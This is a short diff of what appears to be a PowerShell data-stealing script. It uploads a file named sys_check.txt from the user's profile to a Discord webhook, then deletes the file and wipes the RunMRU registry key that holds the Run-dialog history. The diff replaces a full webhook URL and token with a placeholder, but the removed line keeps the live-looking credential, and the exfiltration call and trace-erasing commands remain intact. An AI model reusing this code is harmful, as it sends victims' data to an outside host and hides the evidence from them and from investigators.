@@ -92,7 +92,7 @@ function Send-TextFileToDiscordChannel {
     }
 }
 
-Send-TextFileToDiscordChannel -FilePath "$env:USERPROFILE\sys_check.txt" -WebhookUrl "https://discordapp.com/api/webhooks/1208302508607279185/cIM-H8mB-Txf2yqUW12819rlKaYMQ6g3IuTJJ058vTDieVw6qlzCJHgKlT8xr6IEDB5j"
+Send-TextFileToDiscordChannel -FilePath "$env:USERPROFILE\sys_check.txt" -WebhookUrl "?????"
 
 rm $env:USERPROFILE\sys_check.txt -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
